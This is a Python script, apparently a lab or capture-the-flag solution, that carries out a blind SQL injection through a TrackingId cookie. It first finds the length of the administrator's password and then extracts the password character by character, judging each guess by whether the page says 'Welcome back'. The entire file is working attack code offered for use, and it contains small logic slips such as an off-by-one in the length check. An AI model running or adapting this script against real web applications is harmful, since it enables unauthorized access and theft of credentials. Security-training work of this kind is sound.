#!/usr/bin/env python3
# Blind SQL injection with conditional responses
import requests
import string
import sys

# Debugging
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
p = {'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}

def get_password(url, cookie, session, number):
    admin_passwd = list()
    for iteration in range(1,number+1):
        for character in string.printable:
            payload = f"' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), {iteration}, 1) = '{character}"
            c = {'TrackingId':f'{cookie}{payload}', 'session':f'{session}'}
            req = requests.get(url, cookies=c, verify=False, proxies=p)
            if "Welcome back" in req.text:
                admin_passwd.append(character)
                break
            #print(f"[-] Trying={''.join(admin_passwd) + character}")
            x = ''.join(admin_passwd) + character
            sys.stdout.write('\r' + x)
            sys.stdout.flush()

def get_length(url, cookie, session):
    for i in range(1,100):
        payload = f"' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)={i})='a"
        c = {'TrackingId':f'{cookie}{payload}', 'session':f'{session}'}
        req = requests.get(url, cookies=c, verify=False, proxies=p)
        if "Welcome" in req.text:
            return i+1
        i = i+1
    return False

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        cookie = sys.argv[2].strip()
        session = sys.argv[3].strip()
    except IndexError:
        print("[-] Usage: {} <url> <cookie_value> <session_value>".format(sys.argv[0]))
        print("[-] Example: {} http://example.com abcdef123 abcdef123".format(sys.argv[0]))
        sys.exit(1)

    print("[-] Finding the password length...")
    passwd_length = get_length(url, cookie, session)
    if passwd_length:
        print("[-] Found the password length... [{}]".format(passwd_length))
        print("[-] Retrieving administrator password...")
        get_password(url, cookie, session, passwd_length)
    else:
        print("[-] Can't find the password length!")